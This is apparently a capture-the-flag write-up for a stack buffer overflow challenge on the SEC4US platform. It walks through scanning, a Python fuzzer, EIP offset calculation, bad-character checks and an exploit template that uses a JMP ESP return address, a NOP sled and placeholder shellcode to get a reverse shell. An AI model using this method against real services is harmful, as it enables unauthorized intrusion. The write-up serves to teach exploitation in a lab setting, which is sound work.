# MAQ130: Servico Vulneravel

Writeup for the **Servico Vulneravel** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Buffer Overflow
> **Difficulty:** Hard
> **Points:** 130

---

## Overview

A classic stack-based buffer overflow challenge where a vulnerable network service accepts unchecked input, allowing an attacker to overwrite EIP and redirect execution to injected shellcode. This exercise covers the fundamentals of manual exploit development: fuzzing, offset calculation, bad character identification, and payload delivery.

## Reconnaissance

```bash
nmap -sC -sV -p- [TARGET_IP]
```

The scan reveals a custom service listening on a high port. Connecting with netcat shows an interactive prompt that accepts user input.

```bash
nc -v [TARGET_IP] [PORT]
```

## Exploitation

### Step 1: Fuzzing

Send progressively larger payloads to identify the crash point and confirm the overflow.

```python
import socket

buffer = "A" * 100
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("[TARGET_IP]", [PORT]))
    s.send(buffer.encode())
    s.close()
    buffer += "A" * 100
```

### Step 2: Offset Calculation

Generate a unique pattern with `msf-pattern_create` and identify the exact EIP offset with `msf-pattern_offset`.

```bash
msf-pattern_create -l [CRASH_LENGTH]
msf-pattern_offset -l [CRASH_LENGTH] -q [EIP_VALUE]
```

### Step 3: Bad Character Analysis

Send all possible byte values (0x00 through 0xFF) after the EIP offset to identify characters that corrupt the payload.

### Step 4: Shellcode and Exploit

1. Generate shellcode excluding bad characters.
2. Find a `JMP ESP` instruction in a loaded module without ASLR/DEP.
3. Build the final payload: padding + EIP (JMP ESP address) + NOP sled + shellcode.

```python
import socket, struct

offset = [OFFSET]
eip = struct.pack("<I", 0x[JMP_ESP_ADDR])
nops = b"\x90" * 16
shellcode = b"[GENERATED_SHELLCODE]"

payload = b"A" * offset + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[TARGET_IP]", [PORT]))
s.send(payload)
s.close()
```

Catch the reverse shell and retrieve the flag.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploitation of Remote Services | T1210 |
| Command and Scripting Interpreter | T1059 |
| Process Injection | T1055 |

### CWE

- **CWE-121:** Stack-based Buffer Overflow
- **CWE-787:** Out-of-bounds Write
- **CWE-676:** Use of Potentially Dangerous Function

---

The stack never lies: every byte has a seat, and when you know exactly where EIP sits, the service hands you the keys willingly.

(❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
